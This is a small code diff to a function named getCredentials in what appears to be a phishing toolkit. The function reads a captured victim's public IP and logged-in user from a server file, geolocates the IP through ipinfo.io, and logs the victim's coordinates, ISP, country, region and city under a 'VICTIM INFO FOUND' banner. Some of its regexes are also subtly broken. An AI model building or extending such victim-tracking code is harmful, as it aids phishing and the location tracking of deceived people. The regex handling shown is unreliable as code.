@@ -580,7 +580,7 @@ def getCredentials(port):
         with open('Server/www/ip.txt') as creds:
             lines = creds.read().rstrip()
             if len(lines) != 0:
-                ip = re.match('Victim Public IP: (.*?)\n', lines).group(1)
+                ip = re.match('Victim Public IP: (.*.*.*)\n', lines).group(1)
                 user = re.match('Current logged in user: (a-z0-9)\n', lines)
                 resp = urlopen('https://ipinfo.io/{0}/json'.format(ip))
                 ipinfo = json.loads(resp.read().decode(resp.info().get_param('charset') or 'utf-8'))
@@ -592,7 +592,7 @@ def getCredentials(port):
                     latitude = matchObj.group(1)
                     longitude = matchObj.group(2)
                     writeLog('..................................................................'.format(MAIN0, MAIN4))
-                    writeLog(_(' \n{0}[ VICTIM INFO FOUND ]{1}:\n {0}{2}{1}').format(MAIN3, MAIN2, lines))
+                    writeLog(_(' \n{0}[ VICTIM INFO FOUND ]{1}:\n{0}{2}{1}').format(MAIN3, MAIN2, lines))
                     writeLog(_(' \n{0}Longitude: {2} \nLatitude: {3}{1}').format(MAIN3, MAIN2, longitude, latitude))
                     writeLog(_(' \n{0}ISP: {2} \nCountry: {3}{1}').format(MAIN3, MAIN2, ipinfo['org'], ipinfo['country']))
                     writeLog(_(' \n{0}Region: {2} \nCity: {3}{1}').format(MAIN3, MAIN2, ipinfo['region'], ipinfo['city']))
